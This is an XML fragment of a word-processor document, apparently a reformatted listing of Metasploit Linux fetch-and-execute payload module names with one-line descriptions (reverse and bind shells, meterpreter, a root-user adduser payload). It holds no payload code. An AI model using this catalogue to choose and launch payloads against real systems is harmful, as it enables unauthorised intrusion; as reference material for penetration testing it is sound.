      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp <text:s text:c="22"/>from an HTTP server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp_uuid <text:s text:c="17"/>from an HTTP server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/meterpreter_ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_http <text:s text:c="21"/>from an HTTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/meterpreter_ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_https <text:s text:c="20"/>from an HTTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/meterpreter_ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp <text:s text:c="22"/>from an HTTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/metsvc_bind_ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp <text:s text:c="30"/>from an HTTP server. Stub payl</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>oad for interacting with a Mete</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rpreter Service</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/metsvc_rever <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_tcp <text:s text:c="27"/>from an HTTP server. Stub payl</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>oad for interacting with a Mete</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rpreter Service</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/read_file <text:s text:c="4"/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>from an HTTP server. Read up t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o 4096 bytes from the local fil</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e system and write it back out</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>to the specified file descripto</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell/bind_i <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pv6_tcp <text:s text:c="26"/>from an HTTP server. Spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell (staged). Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection (Linux x8</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>6)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell/bind_i <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pv6_tcp_uuid <text:s text:c="21"/>from an HTTP server. Spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell (staged). Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell/bind_n <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>onx_tcp <text:s text:c="26"/>from an HTTP server. Spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell (staged). Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell/bind_t <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>cp <text:s text:c="31"/>from an HTTP server. Spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell (staged). Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell/bind_t <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp_uuid <text:s text:c="26"/>from an HTTP server. Spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell (staged). Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection with UUID Suppo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell/find_t <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ag <text:s text:c="31"/>from an HTTP server. Spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell (staged). Use an e</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>stablished connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell/revers <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_ipv6_tcp <text:s text:c="23"/>from an HTTP server. Spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell (staged). Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell/revers <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_nonx_tcp <text:s text:c="23"/>from an HTTP server. Spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell (staged). Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell/revers <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp <text:s text:c="28"/>from an HTTP server. Spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell (staged). Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell/revers <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp_uuid <text:s text:c="23"/>from an HTTP server. Spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell (staged). Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell_bind_i <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pv6_tcp <text:s text:c="26"/>from an HTTP server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection over IPv6 and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell_bind_t <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="31"/>from an HTTP server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection and spawn a comm</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>and shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell_bind_t <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp_random_port <text:s text:c="19"/>from an HTTP server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection in a random port</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>and spawn a command shell. Use</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>nmap to discover the open port</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>: 'nmap -sS target -p-'.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell_find_p <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ort <text:s text:c="30"/>from an HTTP server. Spawn a s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hell on an established connecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>on</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell_find_t <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ag <text:s text:c="31"/>from an HTTP server. Spawn a s</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>hell on an established connecti</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>on (proxy/nat safe)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell_revers <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp <text:s text:c="28"/>from an HTTP server. Connect b</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>ack to attacker and spawn a com</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mand shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/shell_revers <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp_ipv6 <text:s text:c="23"/>from an HTTP server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to attacker and spawn a com</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mand shell over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/mips64/meterpre <text:s/>Fetch and execute an MIPS64 pay</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter_reverse_http <text:s text:c="16"/>load from an HTTPS server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/mips64/meterpre <text:s/>Fetch and execute an MIPS64 pay</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter_reverse_https <text:s text:c="15"/>load from an HTTPS server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/mips64/meterpre <text:s/>Fetch and execute an MIPS64 pay</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ter_reverse_tcp <text:s text:c="17"/>load from an HTTPS server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/exec <text:s text:c="8"/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d from an HTTPS server. Execute</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>an arbitrary command or just a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>/bin/sh shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/meterpreter <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_tcp <text:s text:c="23"/>d from an HTTPS server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/meterpreter <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_sctp <text:s text:c="19"/>d from an HTTPS server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/meterpreter <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_tcp <text:s text:c="20"/>d from an HTTPS server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/meterpreter <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_reverse_http <text:s text:c="19"/>d from an HTTPS server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/meterpreter <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_reverse_https <text:s text:c="18"/>d from an HTTPS server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/meterpreter <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_reverse_tcp <text:s text:c="20"/>d from an HTTPS server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/pingback_bi <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nd_tcp <text:s text:c="26"/>d from an HTTPS server. Accept</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a connection from attacker and</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>report UUID (Linux x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/pingback_re <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>verse_tcp <text:s text:c="23"/>d from an HTTPS server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to attacker and report UU</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ID (Linux x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/shell/bind_ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp <text:s text:c="29"/>d from an HTTPS server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>command shell (staged). Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/shell/rever <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_sctp <text:s text:c="25"/>d from an HTTPS server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>command shell (staged). Connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/shell/rever <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_tcp <text:s text:c="26"/>d from an HTTPS server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>command shell (staged). Connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/shell_bind_ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>ipv6_tcp <text:s text:c="24"/>d from an HTTPS server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for an IPv6 connection and spaw</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/shell_bind_ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp <text:s text:c="29"/>d from an HTTPS server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection and spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/shell_bind_ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp_random_port <text:s text:c="17"/>d from an HTTPS server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection in a random po</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt and spawn a command shell. U</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>se nmap to discover the open po</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt: 'nmap -sS target -p-'.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/shell_find_ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>port <text:s text:c="28"/>d from an HTTPS server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>shell on an established connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/shell_rever <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_ipv6_tcp <text:s text:c="21"/>d from an HTTPS server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to attacker and spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x64/shell_rever <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_tcp <text:s text:c="26"/>d from an HTTPS server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to attacker and spawn a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommand shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/adduser <text:s text:c="5"/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d from an HTTPS server. Create</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a new user with UID 0</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/chmod <text:s text:c="7"/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d from an HTTPS server. Runs ch</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mod on specified file with spec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ified mode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/exec <text:s text:c="8"/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d from an HTTPS server. Execute</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>an arbitrary command or just a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>/bin/sh shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/generic/deb <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ug_trap <text:s text:c="25"/>d from an HTTPS server. Generat</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e a debug trap in the target pr</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ocess</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/generic/tig <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ht_loop <text:s text:c="25"/>d from an HTTPS server. Generat</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e a tight loop in the target pr</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ocess</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/meterpreter <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_ipv6_tcp <text:s text:c="18"/>d from an HTTPS server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for an IPv6 connection (Linux x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/meterpreter <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_ipv6_tcp_uuid <text:s text:c="13"/>d from an HTTPS server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for an IPv6 connection with UUI</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>D Support (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>cmd/linux/https/x86/meterpreter <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_nonx_tcp <text:s text:c="18"/>d from an HTTPS server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/meterpreter <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_tcp <text:s text:c="23"/>d from an HTTPS server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/meterpreter <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/bind_tcp_uuid <text:s text:c="18"/>d from an HTTPS server. Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection with UUID Supp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ort (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/meterpreter <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/find_tag <text:s text:c="23"/>d from an HTTPS server. Use an</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>established connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/meterpreter <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_ipv6_tcp <text:s text:c="15"/>d from an HTTPS server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/meterpreter <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_nonx_tcp <text:s text:c="15"/>d from an HTTPS server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/meterpreter <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_tcp <text:s text:c="20"/>d from an HTTPS server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/meterpreter <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>/reverse_tcp_uuid <text:s text:c="15"/>d from an HTTPS server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/meterpreter <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_reverse_http <text:s text:c="19"/>d from an HTTPS server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/meterpreter <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_reverse_https <text:s text:c="18"/>d from an HTTPS server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/meterpreter <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_reverse_tcp <text:s text:c="20"/>d from an HTTPS server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/metsvc_bind <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>d from an HTTPS server. Stub pa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>yload for interacting with a Me</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>terpreter Service</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/metsvc_reve <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rse_tcp <text:s text:c="25"/>d from an HTTPS server. Stub pa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>yload for interacting with a Me</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>terpreter Service</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/read_file <text:s text:c="3"/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d from an HTTPS server. Read up</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>to 4096 bytes from the local f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ile system and write it back ou</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t to the specified file descrip</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tor</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell/bind_ <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ipv6_tcp <text:s text:c="24"/>d from an HTTPS server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>command shell (staged). Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>for an IPv6 connection (Linux</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell/bind_ <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ipv6_tcp_uuid <text:s text:c="19"/>d from an HTTPS server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="38"/>command shell (staged). Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>for an IPv6 connection with UU</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ID Support (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell/bind_ <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nonx_tcp <text:s text:c="24"/>d from an HTTPS server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>command shell (staged). Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell/bind_ <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp <text:s text:c="29"/>d from an HTTPS server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>command shell (staged). Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>for a connection (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell/bind_ <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp_uuid <text:s text:c="24"/>d from an HTTPS server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>command shell (staged). Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>for a connection with UUID Sup</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>port (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell/find_ <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tag <text:s text:c="29"/>d from an HTTPS server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>command shell (staged). Use an</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>established connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell/rever <text:s/>Fetch and execute an x86 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>se_ipv6_tcp <text:s text:c="21"/>d from an HTTPS server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>command shell (staged). Connec</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t back to attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/https/x86/shell/rever <text:s/>Fetch and execute an x86 payloa</text:p>
